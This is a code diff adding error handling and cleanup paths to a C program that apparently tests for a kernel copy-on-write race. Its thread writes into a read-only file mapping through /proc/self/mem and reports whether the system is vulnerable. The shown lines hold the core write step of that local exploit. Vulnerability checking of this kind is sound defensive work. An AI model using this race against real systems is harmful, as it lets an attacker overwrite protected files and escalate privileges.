@@ -2,6 +2,7 @@
 
 #include <stdlib.h>
 #include <stdio.h>
+#include <errno.h>
 #include <fcntl.h>
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -53,17 +54,33 @@ static void *memwrite_thread(void *arg) {
 	size_t len = strlen(str);
 
 	int i, c = 0, fd = open("/proc/self/mem", O_RDWR);
+	if (fd < 0) {
+		(void)perror("write: open()");
+		goto fail;
+	}
 
 	for (i = 0; args->cont && i < ITERATIONS; ++i) {
 		if (0 == (i % DEBUG_ITER_PRINT_IVAL)) {
 			__DEBUG_PRINTF("memwrite thread iteration %u" NL, i);
 		}
 
-		(void)lseek(fd, map, SEEK_SET);
-		c += write(fd, str, len);
+		if (map == lseek(fd, map, SEEK_SET)) {
+			c += write(fd, str, len);
+		} else {
+			if (errno) {
+				(void)perror("write: lseek()");
+			} else {
+				(void)fprintf(stderr, "write: did not seek to correct"
+							  "position, but no error code was given" NL);
+			}
+		}
 	}
 
+  fail:
 	args->cont = false;
+	if (fd >= 0 && close(fd)) {
+		(void)perror("write: close()");
+	}
 
 	__DEBUG_PRINTF("memwrite %d" NL, c);
 	return NULL;
@@ -78,10 +95,15 @@ static int run_test() {
 	(void)printf("Using file '%s' for testing..." NL, filepath);
 
 	fd = open(filepath, O_RDONLY);
+	if (fd < 0) {
+		(void)perror("run: open()");
+		goto fail;
+	}
+
 	struct stat st;
 	if (fstat(fd, &st)) {
 		(void)perror("run: fstat()");
-		return 1;
+		goto fail;
 	}
 
 	void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
@@ -89,7 +111,7 @@ static int run_test() {
 		(void)perror("run: mmap()");
 		(void)fprintf(stderr, "st_size = %zu ; fd = %u" NL,
 					  (size_t)st.st_size, fd);
-		return 1;
+		goto fail;
 	}
 	__DEBUG_PRINTF("mmap %p" NL, map);
 
@@ -140,12 +162,18 @@ static int run_test() {
 		(void)printf("%s" NL, buf);
 	}
 
+
+  cleanup:
 	(void)free(buf);
 	if (fd >= 0 && close(fd)) {
 		(void)perror("run: close()");
 	}
 
 	return (vulnerable ? EXIT_SUCCESS : EXIT_FAILURE);
+
+  fail:
+	vulnerable = false;
+	goto cleanup;
 }
 
 int main(int argc, char *argv[]) {
